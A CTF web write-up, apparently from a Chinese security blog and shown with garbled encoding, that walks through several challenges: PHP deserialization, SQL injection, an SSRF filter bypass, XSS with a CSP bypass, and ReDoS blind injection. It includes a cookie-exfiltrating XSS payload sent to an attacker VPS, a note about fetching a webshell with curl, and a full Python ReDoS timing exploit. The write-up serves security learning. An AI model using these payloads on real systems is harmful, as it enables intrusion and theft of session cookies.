¹æ®æç¤ºè¯»åˆ°æŸä¸ªé‡è¦php 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass trick&#123; public $gf; public function content_to_file($content)&#123; $passwd = $_GET['pass']; if(preg_match('/^[a-z]+\\.passwd$/m',$passwd)) &#123; if(strpos($passwd,\"20200202\"))&#123; echo file_get_contents(\"/\".$content); &#125; &#125; &#125; public function aiisc_to_chr($number)&#123; if(strlen($number)&gt;2)&#123; $str = \"\"; $number = str_split($number,2); foreach ($number as $num ) &#123; $str = $str .chr($num); &#125; return strtolower($str); &#125; return chr($number); &#125; public function calc()&#123; $gf=$this-&gt;gf; if(!preg_match('/[a-zA-z0-9]|\\&amp;|\\^|#|\\$|%/', $gf))&#123; eval('$content='.$gf.';'); $content = $this-&gt;aiisc_to_chr($content); return $content; &#125; &#125; public function __destruct()&#123; $this-&gt;content_to_file($this-&gt;calc()); &#125; &#125;unserialize((base64_decode($_GET['code'])));?&gt; å±å®ä½©æœå‡ºé¢˜äººasciiç éƒ½èƒ½æ‰“é”™ã€‚ä¸Šé¢ä¸€å±‚æ¢è¡Œç¬¦ç»•è¿‡passwordçš„æ ¡éªŒa.passwd%0a20200202ä¸‹é¢æœ‰ç‚¹åƒphpé‡Œçš„æ„é€ æŠ€å·§å¯ä»¥ç”¨å–åï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¤æ‚çš„å­—ç¬¦æ‹¼æ¥flagå¤§å†™asciiç çš„æ•°å­—ã€‚exp 123456789101112131415&lt;?phpclass trick&#123; public $gf;&#125;&#x2F;*$abc&#x3D;&quot;FLAG&quot;;for($i&#x3D;0;$i&lt;&#x3D;strlen($abc);$i++)&#123; echo(ord($abc[$i]));&#125;*&#x2F;#70766571$o&#x3D;new trick();$o-&gt;gf&#x3D;&#39;~&#39;.~&#39;70766571&#39;;#~\\xC8\\xCF\\xC8\\xC9\\xC9\\xCA\\xC8\\xCEecho(base64_encode(serialize($o)));?&gt; sqlcheckinä¸€ä¸ªå˜ç§çš„ä¸‡èƒ½å¯†ç ï¼Œè¿˜å±…ç„¶æ˜¯ä¸ªåŸé¢˜ã€‚å¯æƒœæ²¡åšè¿‡ã€‚è¯­å¥å¾ˆæ¸…æ™° 1$stmt = $pdo-&gt;prepare(\"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'\"); è¿™æ¬¡å› ä¸ºä¸Šé¢é‚£é“å‘é¢˜åˆæŸ¥äº†ä¸å°‘sqlæ³¨å…¥çš„èµ„æ–™ï¼Œä¸­é—´ä¹Ÿå­¦åˆ°äº†ä¸€ä¸ªtrickï¼Œæ¯”å¦‚æ­¤é¢˜payload: 1234admin&#39;-0-&#39; or &#39;^0^&#39; acdvvadva&#39; &amp;&#39;1 #å‰é¢éšä¾¿ä¸€ä¸ªå­—ç¬¦ä¸²éƒ½å¯ å®é™…å°±æ˜¯åˆ©ç”¨äº†mysqlé‡Œå­—ç¬¦çš„ç‰¹æ€§ã€‚æ¯”å¦‚ä¸‡èƒ½å¯†ç username=&#39;admin&#39;-0-&#39;&#39;é‡Œmysqlä¼šæŠŠadminè½¬ä¸ºæ•°å­—ï¼Œå› ä¸ºå®ƒè·Ÿæ•°å­—è¿ç®—äº†ã€‚å¦‚æœè¿™é‡Œ0æ¢æˆ1ç›¸å½“äºusername=-1ï¼Œå±äºé”™è¯¯ã€‚å¦‚æœæ¢æˆusername=0åˆ™ç›´æ¥è¿”å›æ‰€æœ‰ç»“æœã€‚åŒç†ï¼Œè¿™ä¸ªæ€è·¯å¯ä»¥å¸¦åˆ°å¼‚æˆ–ã€‚è¿›ä¸€æ­¥è¿˜å¯ä»¥ç”¨åœ¨æŸäº›è¿‡æ»¤è¾ƒå¤šçš„ç›²æ³¨ä¸‹ï¼Œæ¯”å¦‚è¿‡æ»¤äº†æ³¨é‡Šç¬¦å·æ—¶çš„å¸ƒå°”ç›²æ³¨ï¼š 1234payload&#x3D;&#39;-(1&#x3D;1)-&#39; å¸ƒå°”å€¼å‡payload&#x3D;&#39;-(1&#x3D;0)-&#39; å¸ƒå°”å€¼çœŸ...payload&#x3D;&#39;-(length(database())&#x3D;12)-&#39; hackmeæœ€æ—©åšçš„ä¸€é“é¢˜ã€‚å…¶å®æ€è·¯è›®æ¸…æ™°çš„ï¼Œä½†æ˜¯åæ¥æ²¡åšäº†ã€‚å…¶å®æœ‰ä¸€éƒ¨åˆ†åŸå› æ˜¯å› ä¸ºè‡ªå·±æœ€åä¸€æ­¥5å­—å‘½ä»¤æ‰§è¡ŒhitconåŸé¢˜ä¸€ç›´æ²¡åšå‡ºæ¥è¿‡ã€‚è¿·æƒ‘ã€‚å¼€å§‹æ˜¯å®¡è®¡æºç ï¼Œåœ¨profile.phpä¸­å‘ç°æœ‰ä¸€ä¸ªsession.serialize_handleråºåˆ—åŒ–å¤„ç†å™¨ä¸åŒçš„é—®é¢˜ã€‚æ‰€ä»¥åªè¦æŠŠåºåˆ—åŒ–æ•°æ®å†™è¿›sessionå¹¶æ»¡è¶³ä»–this-&gt;admin=1çš„æ¡ä»¶å³å¯ã€‚è¿™é¢˜æä¾›äº†ä¸€ä¸ªç°æˆçš„å¯æ§å‚æ•°ã€‚æ‰€ä»¥ä¸éœ€è¦åƒåŸæ¥jarvisojä¸Šåšçš„ä¸€é“é¢˜é‚£æ ·æ„é€ ä¸€ä¸ªä¸Šä¼ å†™å…¥session.è¿›å…¥profileåå¯ä»¥çœ‹åˆ°æºç æ˜¯hitconåŸé¢˜ï¼Œä½†æ˜¯å‰é¢åŠ äº†ä¸€å±‚è¿‡æ»¤å…¶å®å°±æ˜¯ç»å…¸çš„filtervar+pregmatchä¹‹å‰æ›¾ç»æ•´ç†è¿‡ssrfçš„ç»å…¸wafï¼šhttps://www.jianshu.com/p/095f233cc9d5 12345678910111213141516171819&lt;?php echo \"Argument: \".$argv[1].\"\\n\"; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match('/google\\.com$/', $r['host'])) &#123; // get page from URL exec('curl -v -s \"'.$r['host'].'\"', $a); print_r($a); &#125; else &#123; echo \"Error: Host not allowed\"; &#125; &#125; else &#123; echo \"Error: Invalid URL\"; &#125;?&gt; å½“æ—¶payloadæ˜¯0://evil.com:80;google.com:80ä½†æ˜¯æ­¤é¢˜å…¶å®è·Ÿbytectfçš„boringcodeæ›´åƒã€‚å¹¸å¥½è‡ªå·±æ¯”èµ›å‰å‡ å¤©æ‰å¤ç°è¿‡ã€‚å…·ä½“ç»†èŠ‚ä¸Šå°±æ˜¯å°†hostçš„googleæ”¹ä¸ºbaiduï¼ŒåŠ äº†ä¸€å±‚dataåè®®çš„è¿‡æ»¤ã€‚ä»¥åŠssrfæ–¹å¼å˜ä¸ºfile_get_contents()æ³¨æ„ï¼ŒåŸæœ¬curlçš„æ—¶å€™æˆ‘ä»¬æ˜¯æœ‰å¤šè§£çš„ã€‚ä½†æ˜¯ssrfæ¢æˆfile_get_contents()è¯·æ±‚åªæœ‰ä¸€ç§æ™®éçš„æ–¹å¼å°±æ˜¯data://google.com/plain;base64,SSBsb3ZlIFBIUAo=hoståçš„å†…å®¹ç›´æ¥ä»¥è·¯å¾„ç»•è¿‡ã€‚å¹¶ä¸”ä½œä¸ºè¯·æ±‚å†…å®¹è¾“å‡ºã€‚æ­¤é¢˜è¿‡æ»¤äº†dataï¼Œä¸bytectfä¸€è‡´ã€‚å½“æ—¶æˆ‘çœ‹åˆ°boringcodeè¿™é¢˜å¾ˆå¤šæˆ˜é˜Ÿè§£å†³æ–¹æ³•æ˜¯è´­ä¹°åŸŸåç»•è¿‡å¯¹hostçš„é™åˆ¶ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰è¯´ç”¨baidu302è·³è½¬çš„ï¼Œè¿™é‡Œæ˜¾ç„¶ä¸è¡Œï¼›æœ‰è¯´ç”¨ftpåè®®çš„ï¼Œæˆ‘è¯•è¿‡ä¹Ÿä¸è¡Œã€‚å½“æ—¶è¿˜å‰©ä¸‹ä¸€ç§è§£å†³æ–¹æ³•æˆ‘è¯•äº†ä¸€ä¸‹å‘ç°å¯ä»¥ï¼Œå°±æ˜¯compress.zlib://data:@baidu.com/baidu.com?,echo(scandir(&#39;.&#39;));è€Œä¸”ç›´æ¥ä»è·¯å¾„è·å–å†…å®¹æ¯”å¦ä¸€ç§æ–¹æ³•ç®€å•è®¸å¤šã€‚ æ‰€ä»¥æ­¤é¢˜ç›´æ¥ä½¿ç”¨è¿™ä¸€æ–¹æ³•å°±èƒ½ç»•è¿‡æ ¡éªŒäº†ã€‚compress.zlib://data:@127.0.0.1/plain;base64,åé¢hitconçš„å†…å®¹ä¸å¤šè¯´ã€‚æˆ‘è§‰å¾—è‡ªå·±è™½ç„¶orangeçš„è„šæœ¬ç”¨ä¸å‡ºæ¥ï¼Œå…¶ä»–æ–¹æ³•è¯´ä¸å®šå¯ä»¥ã€‚æ¯”å¦‚æŠŠé‡Œé¢çš„å‘½ä»¤æ¢æˆcurl vps ip &gt; a.phpå†™å…¥ä¸€å¥è¯ã€‚ happyvacationæœ‰æ„æ€çš„é¢˜ç›®ï¼Œå°±æ˜¯æˆ‘payloadå‡ ä¹éƒ½å®Œæˆäº†ç»“æœæ²¡åšå‡ºæ¥ã€‚æ³ªæµæ»¡é¢ã€‚å¼€å§‹ç¬¬ä¸€å¤©å‘ç°æ˜¯ä¸ªCSP,åŠ ä¸Šæœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚ç›´æ¥å°±çŒœæ˜¯xss+cspbypassã€‚ç»“æœè¯•äº†ä¸‹å‘ç°ä¸ªåˆ«å‚æ•°ä¸€å †è¿‡æ»¤è¿˜æœ‰æ²¡æ‰¾åˆ°xssçš„ç‚¹ã€‚ç¬¬äºŒå¤©æ‰çŸ¥é“æœ‰gitæºç æ³„éœ²ï¼Œç«‹é©¬åŸåœ°å¤æ´»ã€‚æ¯”èµ›æ—¶æ•´ç†çš„è¦ç‚¹ 123456789101112131.$messageå¯æ§ï¼Œç»•è¿‡preg_match&#39;&#x2F;coo|&lt;|ja|\\&amp;|\\\\\\|&gt;|win&#x2F;i&#39;åaddslashesåå­˜å‚¨èµ·æ¥ç„¶åshowmessage()é‡Œè°ƒç”¨äº†echo &quot;&lt;body&gt;&lt;script&gt; var a &#x3D; &#39;&#123;$this-&gt;info-&gt;message&#125;&#39;;document.write(a);&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&quot;;2.$answerå¯æ§ç»•è¿‡preg_match &quot;&#x2F;[^a-zA-Z_\\-&#125;&gt;@\\]*]&#x2F;i&quot;è·Ÿ&#x2F;f|sy|and|or|j|sc|in&#x2F;iæ‹¼æ¥è¿›eval(eval(&quot;\\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;);)3.$refererå¯æ§è·³è½¬4.æ–‡ä»¶ä¸Šä¼ ç¦äº†[&#39;ph&#39;, &#39;ht&#39;, &#39;sh&#39;, &#39;pe&#39;, &#39;j&#39;, &#39;&#x3D;&#39;, &#39;co&#39;, &#39;\\\\&#39;, &#39;&quot;&#39;, &#39;\\&#39;&#39;] è¿™é‡ŒCSPå†™çš„å¾ˆåŸºæœ¬ï¼Œå°±æ˜¯ä¸ªå…è®¸åŒæºè„šæœ¬ï¼Œè€Œä¸”å¼€æ”¾äº†unsafe-inlineã€‚è¿™ç§ç»™äº†æ–‡ä»¶ä¸Šä¼ çš„jså°±æ˜¯ç™½ç»™ã€‚CSPè½»æ¾è§£å†³ã€‚ç°åœ¨å…³é”®æ˜¯wafã€‚$messageæ˜¯ä¼ æ‰“xssçš„è¯­å¥çš„ã€‚ä½†æ˜¯è¿‡äº†ä¸€å±‚addslashesåè¢«å†™å…¥è¯­å¥ï¼Œæ„å‘³ç€å¿…é¡»è¦è§£å†³å®½å­—ç¬¦çš„é—®é¢˜ã€‚è¿™é‡Œå¦‚æœæ˜¯å¸¸è§„æ–¹æ³•å¯ä»¥åœ¨é‡Œé¢å†å†™ä¸€ä¸ªscriptå†…å®¹ç»•è¿‡ã€‚å¯æ˜¯æ ‡ç­¾è¢«è¿‡æ»¤äº†ã€‚åªèƒ½è€ƒè™‘å…¶ä»–æ–¹æ³•ã€‚ $answeråº”è¯¥æ˜¯è¦åˆ©ç”¨çš„ï¼Œæœ€ç»ˆå¯ä»¥å®ç°ä¸€ä¸ªevalè¯­å¥ï¼Œä½†æ˜¯ä¸¥æ ¼é™åˆ¶æˆ‘ä»¬åªèƒ½å°†æŸä¸ªå±æ€§ç½®ä¸ºfalseã€‚ lib.phpå¯ä»¥çœ‹è§ä¸€æ®µå…³é”®å‡½æ•° 12345678910111213141516171819function go()&#123; if(isset($this-&gt;pre) and isset($this-&gt;after) and isset($this-&gt;location))&#123; $dest = $this-&gt;pre . $this-&gt;location . $this-&gt;after; header($dest); &#125; else&#123; // Error occured? header(\"Location: index.php\"); &#125;&#125;function __destruct()&#123; if($this-&gt;flag)&#123; if($this-&gt;location !== $this-&gt;page)&#123; $this-&gt;go(); &#125; &#125; ob_end_flush();&#125; ä¸€ä¸ªdestructæ–¹æ³•ï¼Œåœ¨flagä¸ºtrueæ—¶ä¼šè°ƒç”¨goï¼Œç„¶åï¼Œgoå¾ˆå¥‡å¦™çš„æ‹¼æ¥äº†ä¸‰ä¸ªå‚æ•°è¿›è¡Œheader()è®¾è®¡ã€‚é‚£ä¹ˆæ˜¯å¦åªè¦æˆ‘ä»¬æŠŠheaderæ§åˆ¶ä¸ºgbkç¼–ç ï¼Œå°±å¯ä»¥è§£å†³å‰é¢xssè¢«è½¬ä¹‰çš„é—®é¢˜å‘¢ï¼Ÿæ²¡é”™ã€‚æ‰€ä»¥è¿™é‡Œå°±æ˜¯å…¥æ‰‹ç‚¹ã€‚è½¬è€Œè·Ÿè¿›ä¸‹å…³é”®å‡½æ•°ã€‚ 1234if($user-&gt;url-&gt;referer !&#x3D; $user-&gt;url-&gt;page)&#123; $user-&gt;url-&gt;location &#x3D; $user-&gt;url-&gt;referer; &#125; $user-&gt;url-&gt;flag &#x3D; True; é¦–å…ˆï¼Œä¼ å€¼answeræ—¶å°±ä¼šè¿›è¡Œflag=1èµ‹å€¼ï¼ŒåŒæ—¶locationå‚æ•°ä¼šèµ‹å€¼ä¸ºæˆ‘ä»¬å¯æ§çš„refererã€‚é‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å˜æˆé€šè¿‡refereræ§åˆ¶headerã€‚ä¸ºæ­¤å°±è¦è§£å†³preè¿™ä¸ªæ‹¼æ¥çš„å±æ€§ã€‚è¿™æ—¶æˆ‘ä»¬å‰é¢çš„evalè¯­å¥å°±èµ·ä½œç”¨äº†ã€‚å¦‚æœæŠŠthis-&gt;preè®¾ä¸ºfalse,åœ¨æ‹¼æ¥æ—¶å®ƒå°±ä¼šå˜æˆç©ºã€‚é‚£ä¹ˆæˆ‘ä»¬çš„å¯æ§å‚æ•°locationç›´æ¥ä¼ è¿›headerã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œpayloadå°±å¯ä»¥æ„é€ äº†ï¼š 1&#x2F;?answer&#x3D;user-&gt;url-&gt;pre&amp;referer&#x3D;Content-Type:text&#x2F;html; charset&#x3D;GBK;abc&#x3D; æ­¤å¤„éšä¾¿ç”¨abcä¹‹ç±»çš„æ‹¼æ¥ä¸‹åé¢çš„this-&gt;afterå±æ€§å€¼.phpã€‚è¿™æ ·æˆ‘ä»¬çš„index.phpç»ˆäºå¯ä»¥æ‰“xssäº†ï¼Œå¯ä»¥é€ƒé€¸å•å¼•å·ã€‚ 1&#x2F;index.php?message&#x3D;%c0%27; alert(1);&#x2F;&#x2F; ç°åœ¨æƒ³æ¥æˆ‘æ¯”èµ›æ—¶å°±æ˜¯è¿™ä¹ˆæ‰“çš„ã€‚ä½†æ˜¯alert(1)æ²¡æˆï¼Œæˆ‘ä»¥ä¸ºæ˜¯payloadé—®é¢˜å°±æ²¡ç»§ç»­åšäº†â€¦â€¦.ç°åœ¨æƒ³æƒ³å®åœ¨æ˜¯æ‹‰èƒ¯ï¼Œè¿™ä¸ªpayloadå°±æ²¡é—®é¢˜å•Šï¼Œä¼°è®¡æ˜¯æˆ‘å“ªé‡Œç»†èŠ‚æœ‰é—®é¢˜å•Šï¼Œåº”è¯¥ç»§ç»­åšä¸‹å»çš„ï¼Œè‰ã€‚ç„¶åå°±æ˜¯å¸¸è§„é—®é¢˜äº†ï¼Œä¸ºäº†è§£å†³æ²¡æœ‰å•å¼•å·çš„é—®é¢˜ä½¿ç”¨string.fromCharCodeï¼Œè¿™ä¸ªæˆ‘ä¹Ÿé¢„å…ˆæƒ³å¥½äº†è¿™æ ·å†™payloadï¼Œå±…ç„¶å› ä¸ºæå‰æ”¾å¼ƒæ²¡ç”¨å‡ºæ¥ï¼Œè¯¥æ‰“ã€‚ç„¶åå°±å¯ä»¥åŠ è½½å†…è”è„šæœ¬äº†ã€‚åŒæ ·å¾ˆç®€å•ï¼Œå› ä¸ºCSPçš„åŸå› å§srcè®¾ç½®æˆä¸Šä¼ æ–‡ä»¶è·¯å¾„å³å¯ã€‚è¿™é‡Œæˆ‘çœ‹æ¢…å­é…’å­¦é•¿çš„æ–‡ç« ä»‹ç»çš„æ˜¯ç”¨.waveæ–‡ä»¶bypassCSPçš„ã€‚ä¸è¿‡ä¹‹å‰çœ‹è¿‡æ–‡ç« ä»‹ç»è¿‡jpegæˆ–è€…å…¶ä»–æ–‡ä»¶bypassCSPä¹Ÿæ˜¯å¯è¡Œçš„ã€‚ä¸è¿‡éœ€è¦è®¾è®¡ä¸€ä¸‹æ–‡ä»¶å¤´ã€‚æ‰€ä»¥payloadæ„é€ ä¸‹ï¼šä¸Šä¼ å›¾ç‰‡å†…å®¹ 1aaaaaaaaaaaaaaa&#x2F;*bbbbbbbbbbbbbbbbbbb*&#x2F;&#x3D;&#39;test&#39;;window.open(&#39;http:&#x2F;&#x2F;vps:port&#x2F;?&#39;+document.cookie); index.phpæ„é€ message 1234%c0%27; var x=document.createElement('script');x.src='/upload/xxxxx/test.wave'document.body.appendChild(x);// æœ€åpayloadè½¬ä¸€ä¸‹charcodeåº”è¯¥å°±è¡Œäº†ã€‚ è¿™é‡Œå†è†œä¸€ä¸‹æ˜Ÿç›Ÿè·ŸNu1Lç­‰ç­‰æˆ˜é˜Ÿçš„å¸ˆå‚…ä»¬ï¼Œæ•´äº†ä¸ªå·¨ç®€å•çš„éé¢„æœŸã€‚ä¸Šé¢evalè¦†ç›–çš„åœ°æ–¹ç”±äºå‰é¢è°ƒç”¨äº†ä¸€ä¸ªcloneï¼Œæ‰€ä»¥ç›¸å½“äºæ˜¯ä¸ªæ–°çš„userã€‚è¿™æ ·çš„è¯userçš„å±æ€§éƒ½å¯ä»¥æ”¹ã€‚ç”±äºæºç æ‰€æœ‰åŠŸèƒ½éƒ½åœ¨userç±»å®ç°çš„ï¼Œé‚£å°±æ˜¯ä»»æ„å±æ€§éƒ½å¯æ”¹ã€‚ç›´æ¥æŠŠé»‘åå•è¦†ç›–æˆfalse.ç„¶åä¸Šä¼ phpgetshellã€‚flagåœ¨æ ¹ç›®å½•â€¦â€¦éƒå¸ˆå‚…æœ€åä¹Ÿè·Ÿæˆ‘è¯´è¿™ä¸ªæ€è·¯ï¼Œæˆ‘å¼€å§‹è¿˜ä¸æ•¢ä¿¡ã€‚ç»“æœçœŸèƒ½æ•´æˆéé¢„æœŸã€‚å¯æƒœåæ¥è¢«ä¿®å¤äº†ã€‚ ä¸è¯´äº†ï¼Œæ¯”èµ›æ²¡åšå‡ºæ¥å¤ªé—æ†¾äº†ã€‚æœ‰å¤ç°ç¯å¢ƒçš„è¯ä¸€å®šå»å¤ç°ã€‚ guessgameå…ˆæ‰”ä¸€ä¸ªæºç å®¡å®Œå°±å‡ºçš„payload 1&#123;&quot;user&quot;: &#123;&quot;username&quot;:&quot;admÄ±n888&quot;, &quot;__proto__&quot;: &#123;&quot;enableReg&quot;: True&#125;&#125;&#125;) ä¸»è¦æ˜¯ä¸€ä¸ªjså¤§å†™çš„ç»•è¿‡ï¼Œä¸Šæ¬¡å…¬ç›ŠCTFåšè¿‡äº†ã€‚ç„¶åæ˜¯ä¸€ä¸ªè°ƒç”¨äº†mergeçš„åŸå‹é“¾æ±¡æŸ“ã€‚ä¹Ÿæ˜¯ä¸ºäº†è¿›ä¸‹é¢è¿™ä¸ªifã€‚ 1234if(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123; //res.end(flag); //Stop your wishful thinking and go away! &#125; åé¢è¦è·‘flagï¼Œç”¨çš„æ˜¯æ­£åˆ™ç›²æ³¨ã€‚æ‰“æ‰°äº†ï¼Œç¯å¢ƒä¸€ä¸ªä¸ªå¡çš„ä¸€æ¯”ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ³¨ï¼Œç­‰ä¸€æ‰‹å®˜æ–¹wpå§ã€‚çœ‹åˆ°åˆ«é˜Ÿæ€è·¯äº†ï¼Œå¯ä»¥å­¦ä¸‹ã€‚åŸæ¥noDosè¿™ä¸ªæ­£åˆ™å°±æ˜¯è¦åˆ©ç”¨çš„ã€‚å› ä¸ºæ˜¯ä¸ªæ­£åˆ™åŒ¹é…ï¼Œè€Œjavascriptæ­£åˆ™çš„å›æº¯æœºåˆ¶ä¼šè®©æ¶æ„ä»£ç ä½¿æœåŠ¡ç«¯å¤§é‡å ç”¨æœåŠ¡å†…å­˜ã€‚æ¯”å¦‚ä¸€ä¸ª/Ë†a*a*b$/ï¼Œç”¨aaaaaaaaaaaaaå°±å¯ä»¥è®©å…¶å¤šæ¬¡å›æº¯ï¼Œè¾¾æˆjsçš„re(æ­£åˆ™)dosæ”»å‡»ã€‚æ‰€ä»¥æœ¬é¢˜ç›®çš„å°±æ˜¯è®©nodosè¢«æˆ‘ä»¬çš„å¯æ§qå¡ä½ï¼Œç„¶åå‰é¢å·²ç»åŸå‹é“¾æ±¡æŸ“è¾¾æˆifçš„ä¸€ä¸ªçœŸå€¼äº†ï¼Œå‰©ä¸‹çš„ç›¸å½“äºç›²æ³¨flagä½¿ifç¬¬ä¸‰ä¸ªå€¼è¾¾æˆçœŸå€¼ã€‚ 12 g3t(((((.*)+)+)+)+)! (((((.*)+)+)+)+)Y ç±»ä¼¼å¦‚æ­¤çš„payloadä¸æ–­fuzzã€‚ 3.13ï¼šä»Šå¤©æŠŠé¢˜ç›®å¤ç°äº†ä¸€ä¸‹ï¼Œç”¨çš„å‡ºé¢˜äººçš„è„šæœ¬åšäº†åšã€‚é¡ºä¾¿ç†è§£äº†ä¸‹reDOSç›²æ³¨çš„åŸºæœ¬æ¦‚å¿µã€‚å½“ç„¶è¦è·Ÿå‡ºé¢˜äººç‚¹èµï¼Œè¿™é¢˜ç®—æ˜¯å¤´ä¸€æ¬¡è€ƒå¯Ÿäº†reDOSçš„çŸ¥è¯†ç‚¹ï¼Œå¯æƒœå› ä¸ºé¶æœºåŸå› ä¸èƒ½ä¿è¯é€‰æ‰‹ä»¬æ­£å¸¸è§£é¢˜ã€‚å¦‚æœå•ç‹¬ä¸‹å‘å®¹å™¨åº”è¯¥ä¼šæ›´ç¨³å®šã€‚å…³äºçŸ¥è¯†ç‚¹:è¯´èµ·æ¥å…¶å®ä¸éš¾ã€‚reDOSé¦–å…ˆéœ€è¦æ˜ç¡®çš„æ˜¯ï¼šä½¿ç”¨äº†jsçš„NFAä½œä¸ºæ­£åˆ™å¼•æ“ã€‚NFAï¼Œå³éç¡®å®šæœ‰é™çŠ¶æ€è‡ªåŠ¨æœºã€‚å…¶å®ï¼Œä¹‹å‰åœ¨pç‰›çš„pcrewafè¿™ä¸€é¢˜ç›®ä¸­å°±å·²ç»æåŠäº†NFAçš„ç‰¹æ€§ã€‚å®ƒæ­£åˆ™åŒ¹é…æ—¶å‡ºç°çš„å›æº¯æœºåˆ¶å°†ä¼šäº§ç”Ÿå¤§é‡å±å®³ã€‚å¯¹phpè€Œè¨€æ˜¯å›æº¯æ¬¡æ•°æœ‰é™å¯¼è‡´bypassã€‚å¯¹ä½œä¸ºæœåŠ¡ç«¯çš„jsè€Œè¨€ï¼Œåˆ™æ˜¯å ç”¨å¤§é‡ç³»ç»Ÿèµ„æºã€‚ä¹‹å‰æ›¾çœ‹åˆ°å›½å¤–å¤§ä½¬å†™çš„ä¸€ä¸ªæ­£åˆ™ï¼Œå¯ä»¥è®©ä¸€æ¬¡jsçš„æ­£åˆ™åŒ¹é…å ç”¨é«˜è¾¾%99çš„å†…å­˜ã€‚ å›åˆ°è¿™ä¸€çŸ¥è¯†ç‚¹ï¼Œæ¥çœ‹è§£é¢˜çš„ä¸»è¦æ­£åˆ™ 1^(?&#x3D;(some regexp here))((.*)*)*salt$ ç®€å•è§£é‡Šï¼Œåªè¦æˆ‘ä»¬æ‰€éœ€è¦çš„SECRET(æœ¬é¢˜æ˜¯flag)ä¸ä¸­é—´çš„regexpéƒ¨åˆ†ç›¸åŒ¹é…ï¼Œæ•´ä¸ªæ­£åˆ™å°†å¯¼è‡´æ•´ä¸ªåŒ¹é…è¿‡ç¨‹å»¶æ—¶åˆ°2ç§’å¤šçš„æ—¶é—´ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œåªè¦èƒ½é€šè¿‡æ„é€ æ­£åˆ™è¡¨è¾¾å¼æ¥æ³¨å…¥ï¼Œå°†è¾¾åˆ°è·Ÿsqlæ—¶é—´ç›²æ³¨ä¸€æ ·çš„æ•ˆæœï¼Œå¾—åˆ°è¿›è¡Œæ­£åˆ™åŒ¹é…çš„flagé™„ä¸Šå‡ºé¢˜äººçš„exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import socketimport sysimport timeimport randomimport stringimport requestsimport re# constantsTHRESHOLD = 2# predicatesdef length_is(n): return \".&#123;\" + str(n) + \"&#125;$\"def nth_char_is(n, c): return \".&#123;\" + str(n-1) + \"&#125;\" + re.escape(c) + \".*$\"# utilitiesdef redos_if(regexp, salt): return \"^(?=&#123;&#125;)((((.*)*)*)*)*&#123;&#125;\".format(regexp, salt)def get_request_duration(payload): try: _start = time.time() requests.post(\"http://vps:port/verifyFlag\", &#123;\"q\": payload&#125;) _end = time.time() duration = _end - _start except: duration = -1 exit(1) return durationdef prop_holds(prop, salt): return get_request_duration(redos_if(prop, salt)) &gt; THRESHOLDdef generate_salt(): return ''.join([random.choice(string.ascii_letters) for i in range(10)])if __name__ == '__main__': salt = \"!\" # generate_salt() # leak length upper_bound = 15 secret_length = 0 for i in range(0, upper_bound): if prop_holds(length_is(i), salt): secret_length = i print(\"[+] length: &#123;&#125;\".format(secret_length)) S = \"qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890\" secret = \"\" for i in range(0, secret_length): for c in S: if prop_holds(nth_char_is(i+1, c), salt): secret += c print(\"[*] &#123;&#125;\".format(secret)) print(\"[+] secret: &#123;&#125;\".format(secret)) å‚è€ƒäº†å‡ºé¢˜äººçš„å‚è€ƒæ–‡ç« ï¼šhttps://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg æ¯”èµ›å…¶ä»–é¢˜ç›®ä¸»è¦æ˜¯é˜Ÿå‹åšçš„ï¼ŒåŸºæœ¬æ²¡æ€ä¹ˆçœ‹ã€‚åˆ°æ—¶å€™æœ‰æœºä¼šå»ç ”ç©¶ä¸‹ã€‚ç„¶åå°±æ˜¯åæ€äº†ã€‚ç°åœ¨æ°´å¹³è¿˜å¤ªèœï¼Œèµ¶ç´§å¤šèŠ±ç‚¹æ—¶é—´å­¦å­¦çŸ¥è¯†åˆ·åˆ·é¢˜ã€‚ä¸ç„¶å†èœçš„æŠ è„šå°±ä¸¢äººäº†ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"To-Dolist","slug":"To-Dolist","date":"2020-03-09T03:29:58.000Z","updated":"2021-02-18T05:09:50.713Z","comments":true,"path":"2020/03/09/To-Dolist/","link":"","permalink":"https://www.bycsec.top/2020/03/09/To-Dolist/","excerpt":"ç¬¬ä¸€æ¬¡ XCTF å°±è‡ªé—­äº†ã€‚æœ€éš¾å—çš„å°±æ˜¯é˜Ÿå‹è¾›è‹¦ä»˜å‡ºï¼Œè‡ªå·±å´åŸºæœ¬æ²¡å•¥è¾“å‡ºâ€¦â€¦ä¹‹å‰å…¬ç›Šèµ›è¿˜ä»¥ä¸ºæœ‰äº†ä¸€å®šæ°´å‡†ï¼Œç°åœ¨çœ‹è¿˜å·®å¾—è¿œå•Šã€‚æ‰€ä»¥ä¸€å®šè¦ä¸€å®šè¦å°½å¿«æŠŠèƒ½åŠ›æå‡èµ·æ¥ï¼Œåˆ·é¢˜å›ºç„¶é‡è¦ï¼ŒçŸ¥è¯†ç‚¹ä¹Ÿä¸èƒ½è½ä¸‹ã€‚è¿™æ¬¡æ¯”èµ›æ‰“ä¸‹æ¥å‘ç°è‡ªå·±å±…ç„¶åªèƒ½åœ¨sqlè·ŸNode.jsä¸‹æ‰‹ï¼Œå¤ªå˜²è®½äº†ã€‚æŠŠè¿‘æœŸä¸€äº›éœ€è¦å½»åº•å¼„æ‡‚çš„çŸ¥è¯†ç‚¹åˆ—ä¸€ä¸‹ï¼Œæ€»æœ‰ä¸€å¤©è¦å…¨éƒ¨è§£å†³ã€‚","text":"ç¬¬ä¸€æ¬¡ XCTF 